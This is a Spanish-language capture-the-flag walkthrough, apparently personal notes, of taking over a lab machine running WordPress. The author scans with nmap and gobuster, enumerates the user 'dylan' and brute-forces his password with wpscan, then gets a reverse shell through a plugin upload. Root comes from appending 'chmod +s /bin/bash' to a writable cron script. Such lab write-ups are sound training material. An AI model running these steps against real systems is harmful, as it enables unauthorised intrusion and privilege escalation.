Como primer paso realizamos   el scaneo de puerto con la herramienta nmap  usando el siguiente comando 
 nmap -sV 192.168.100.157 
 

![[Pasted image 20260921194348.png]]

como segundo paso vemos  que tenemos pagina web en puerto  80 
 y revisamos  
 
![[Pasted image 20260921194929.png]]

realizamos un enumeración por gobuster  para ver si hay pagina oculta  
 y utilizamos el siguiente connado 
 gobuster dir -u http://192.168.100.157/wordpress -w /usr/share/wordlists/dirb/common.txt -t 50 -x ,.php

![[Pasted image 20260921195021.png]]
y vemos que tenemos una pagina web  realizada en worpress 
![[Pasted image 20260921195243.png]]

ahora realizamos enumeración por con la herramienta wpscan
wpscan --url http://192.168.100.157/wordpress -e u 

![[Pasted image 20260921200119.png]]
 por los cual encontramos usuario  "dylan" 
ahora realizamos explotación 
de la pagina web  con la herramienta wpscan  con el siguiente comando 
  
  wpscan --url http://192.168.100.157/wordpress -e u --passwords /usr/share/wordlists/rockyou.txt  .php,.txt

![[Pasted image 20260921200934.png]]

encontramos usuario y password  
```
dylan / password1  
```
vemos que hay un plugin para subir un archivo 

![[Pasted image 20260921203322.png]]

una ves subimos el archivo  usamos el comando nc  para hacer una reveshell  
![[Pasted image 20260921205936.png]]
una ves realizamos podemos  ejecutar  un terminar  interactivo con el siguiente comando   
```
SHELL=/bin/bash script -q /dev/null
```
una vez ingresado el siguiente comando  control +z 
y ingresamos el siguiente comando 
```
stty raw -echo && fg  
```
y luego exportarnos los demos  
para activar el control +l para limpliar 
y para borrar  comando 
```
 export TERM=xterm 
```
una vez realizado vamos ver si tenemos un binario para subir de privilegio 



```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
```
 ejecutar proceso de segundo plano
![[Pasted image 20260921211654.png]]

Dado que el`www-data` usuario (o los permisos del directorio) permitieron escribir en`/opt` , se creó un`backup.sh` script malicioso para otorgar permisos SUID al binario bash.

```
echo "chmod +s /bin/bash" >> /opt/backup.sh
chmod +x /opt/backup.sh
```

Después de esperar el proceso automatizado para ejecutar el script:

```
ls -l /bin/bash
/bin/bash -p
```

 una ver encontrado realizamos  la captura de las bandera root /user 
![[Pasted image 20260921212143.png]]


![[Pasted image 20260921212214.png]]